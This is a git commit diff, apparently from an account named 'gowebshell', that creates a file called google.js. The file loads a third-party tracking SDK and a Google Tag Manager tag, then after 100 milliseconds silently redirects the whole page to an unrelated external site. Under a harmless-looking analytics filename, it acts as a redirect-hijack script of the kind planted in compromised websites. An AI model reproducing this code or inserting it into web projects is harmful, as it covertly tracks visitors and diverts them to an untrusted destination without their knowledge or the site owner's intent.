f862c40f8a00ca019ab86dec6dbbb95c0a621b13
gowebshell <140425482+gowebshell@users.noreply.github.com>
2023-09-18 15:14:42 +0800

    Create google.js

---
+++ google.js
@@ -0,0 +1,16 @@
+document.write("<script>!function(p){\"use strict\";!function(t){var s=window,e=document,i=p,c=\"\".concat(\"https:\"===e.location.protocol?\"https://\":\"http://\",\"sdk.51.la/js-sdk-pro.min.js\"),n=e.createElement(\"script\"),r=e.getElementsByTagName(\"script\")[0];n.type=\"text/javascript\",n.setAttribute(\"charset\",\"UTF-8\"),n.async=!0,n.src=c,n.id=\"LA_COLLECT\",i.d=n;var o=function(){s.LA.ids.push(i)};s.LA?s.LA.ids&&o():(s.LA=p,s.LA.ids=[],o()),r.parentNode.insertBefore(n,r)}()}({id:\"3FtQUfbaUGsVmeUo\",ck:\"3FtQUfbaUGsVmeUo\"});</script>")
+var _hmt = _hmt || [];
+        (function () {
+            var hm = document.createElement("script");
+            hm.src = "https://www.googletagmanager.com/gtag/js?id=G-X4PXEYJLBC";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+
+	  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-X4PXEYJLBC');
+setTimeout(function(){
+ window.location.href = 'https://877mm.live';
+},100);
